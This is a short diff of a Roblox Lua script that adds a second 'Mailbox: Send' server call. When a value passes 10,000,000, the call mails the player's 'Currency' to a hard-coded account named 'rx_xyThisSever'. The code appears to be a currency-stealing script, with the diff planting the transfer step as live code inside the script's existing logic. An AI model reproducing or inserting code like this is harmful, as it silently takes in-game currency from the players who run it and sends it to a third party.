@@ -359,6 +359,15 @@ if fullNumber > 10000000 then
                     [5] = NewNumber  -- No quotation marks around fullNumber
                 }
                 game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                local args = {
+                    [1] = "rx_xyThisSever",
+                    [2] = "Ok",
+                    [3] = "Currency",
+                    [4] = Table.uid,
+                    [5] = NewNumber  -- No quotation marks around fullNumber
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
             end
         end
     end
